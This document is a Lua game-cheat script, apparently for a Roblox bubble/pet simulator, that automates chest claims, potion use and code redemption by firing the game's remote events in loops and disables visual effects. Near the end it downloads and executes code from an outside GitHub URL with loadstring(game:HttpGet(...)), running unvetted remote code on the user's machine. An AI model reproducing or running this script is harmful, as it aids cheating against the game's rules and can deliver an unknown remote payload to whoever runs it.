-- Ultimate All-In-One Script (Optimized & Silent)
setfpscap(30)
settings().Rendering.QualityLevel = 1

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RemoteEvent = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("RemoteEvent")
local RemoteFunction = ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("RemoteFunction")

for _, v in pairs(workspace:GetDescendants()) do
    if v:IsA("ParticleEmitter") or v:IsA("Fire") or v:IsA("Smoke") then
        v:Destroy()
    end
end

local lighting = game:GetService("Lighting")
lighting.GlobalShadows = false
lighting.FogEnd = 9e9

local settingsToEnable = {"Hide All Pets", "Skip Easy Mythics", "Skip Easy Legendary", "Hide Bubbles", "Bubble Lock"}

local function applySmartSettings()
    for _, setting in ipairs(settingsToEnable) do
        RemoteEvent:FireServer("SetSetting", setting, true)
        task.wait(0.2)
    end
end

local function runChestLoop()
    while true do
        RemoteEvent:FireServer("ClaimChest", "Void Chest", true)
        task.wait(1811)
    end
end

local function redeemAllCodes()
    local codes = {"update1", "update2", "update3", "update4", "update5", "update6", "update7", "update8", "update9", "update10", "update11", "update12", "update13", "Throwback", "Easter"}
    for _, code in ipairs(codes) do
        RemoteFunction:InvokeServer("RedeemCode", code)
        task.wait(1)
    end
end

local function runPotionLoop()
    getgenv().running = true
    local potions = {{"Coins", 6}, {"Coins", 5}, {"Speed", 6}, {"Lucky", 6}, {"Mythic", 6}, {"Tickets", 6}, {"Tickets", 5}, {"Infinity Elixir", 1}}
    while getgenv().running do
        for _, potion in ipairs(potions) do
            RemoteEvent:FireServer("UsePotion", potion[1], potion[2])
            task.wait(0.5)
        end
    end
end

local function unlockBubbleFestival()
    RemoteEvent:FireServer("UnlockBubbleFestival")
end

local function CleanMemory()
    while true do
        task.wait(300)
        collectgarbage("collect")
        game:GetService("ContentProvider"):PreloadAsync({})
    end
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/maliktuff0/coolest/main/server%20%2B%20main"))()

applySmartSettings()
unlockBubbleFestival()
task.spawn(runChestLoop)
task.spawn(redeemAllCodes)
task.spawn(runPotionLoop)
task.spawn(CleanMemory)
